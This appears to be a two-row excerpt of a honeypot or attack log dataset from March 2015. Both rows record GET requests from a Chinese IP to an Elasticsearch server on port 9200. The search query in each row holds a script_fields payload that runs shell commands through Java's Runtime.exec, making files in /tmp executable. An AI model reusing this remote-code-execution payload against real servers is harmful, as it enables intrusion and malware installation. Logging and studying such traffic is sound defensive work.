19	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxun32%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:41:16.037Z	GET	127.0.0.1:40291	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"chmod+777+/tmp/xun32\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
20	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxun64%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:41:17.603Z	GET	127.0.0.1:40297	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"chmod+777+/tmp/xun64\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
